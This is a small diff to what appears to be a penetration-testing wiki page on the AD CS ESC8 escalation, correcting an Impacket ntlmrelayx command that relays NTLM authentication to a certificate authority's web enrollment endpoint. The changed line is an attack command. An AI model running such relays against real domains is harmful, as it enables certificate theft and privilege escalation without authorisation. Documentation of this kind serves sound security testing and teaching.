@@ -31,7 +31,7 @@ This allows for lateral movement, account persistence, and in some cases privile
 From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) can be used to conduct the ESC8 escalation scenario.
 
 ```python
-ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --asp --template "Template name"
+ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --adcs --template "Template name"
 ```
 
 {% hint style="info" %}
